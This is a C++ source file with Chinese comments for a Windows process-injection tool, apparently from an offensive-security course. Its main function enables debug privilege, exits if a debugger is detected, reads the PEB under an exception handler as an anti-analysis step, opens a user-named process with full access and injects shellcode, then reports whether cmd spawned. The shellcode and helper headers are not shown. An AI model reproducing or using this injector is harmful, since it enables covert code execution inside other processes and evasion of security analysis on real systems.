#include <windows.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include "EnableDebugPrivilege.h"
#include "IsDebugging.h"
#include "InjectShellcode.h"

// 异常包裹的 PEB 访问（第6课反制策略）
__declspec(noinline) bool StealthGetPeb() {
    void* pPeb = nullptr;
    __try {
        pPeb = (void*)__readgsqword(0x60);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return pPeb != nullptr;
}

// 通过进程名获取 PID（修复句柄泄漏）
__declspec(noinline) DWORD GetPidByName(const std::string& ProcName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (ProcName == pe.szExeFile) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);  // 确保关闭
    return pid;
}

int main() {
    // ① 提权
    EnableDebugPrivilege();

    // ② 反调试检测
    if (IsDebuggingA()) {
        std::cerr << "[-] 检测到调试器，退出。" << std::endl;
        return 0;
    }

    // ③ 异常包裹的 PEB 访问
    if (!StealthGetPeb()) {
        std::cerr << "[-] PEB 访问失败。" << std::endl;
        return 0;
    }

    // ④ 初始化所有函数指针
    InjectorFuncs f = InitInjectorFuncs();
    if (!f.valid) {
        std::cerr << "[-] 函数解析失败。" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数解析成功" << std::endl;

    // ⑤ 获取目标进程
    std::string ProcName;
    std::cout << "[*] 请输入目标进程名（如 notepad.exe）: ";
    std::getline(std::cin, ProcName);

    DWORD pid = GetPidByName(ProcName);
    if (pid == 0) {
        std::cerr << "[-] 未找到进程: " << ProcName << std::endl;
        return 1;
    }
    std::cout << "[+] 找到进程 PID: " << pid << std::endl;

    // ⑥ 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败，错误码: " << GetLastError() << std::endl;
        return 1;
    }

    // ⑦ 注入
    if (InjectShellCode(hProcess, f)) {
        std::cout << "[+] 注入成功！请观察目标进程是否弹出 cmd。" << std::endl;
    } else {
        std::cerr << "[-] 注入失败。" << std::endl;
    }

    f.CloseHandle(hProcess);
    system("pause");
    return 0;
}